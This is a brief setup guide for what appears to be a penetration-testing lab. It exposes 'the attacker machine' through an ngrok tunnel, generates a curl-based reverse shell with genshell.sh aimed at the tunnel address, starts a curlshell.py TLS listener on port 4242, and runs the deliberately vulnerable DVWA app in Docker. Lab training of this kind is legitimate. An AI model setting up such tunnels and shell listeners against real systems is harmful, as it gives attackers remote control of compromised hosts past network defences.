Install NGROK:
--------------
This is required to create a public facing tunnel for the attacker machine

brew install ngrok

Start ngrok tunnel and setup redirect:
-------------------------------------

ngrok http https://localhost:4242
Make note of the FQDN

Start a listener:
----------------
cd scripts/curlsh
./genshell.sh 'FQDN noted above'
python3 curlshell.py --certificate curlshell.crt --private-key curlshell.key --listen-port 4242

Running DVWA:
------------
Clone and change to root folder
docker compose up
OR
docker compose up -d ( for BG)



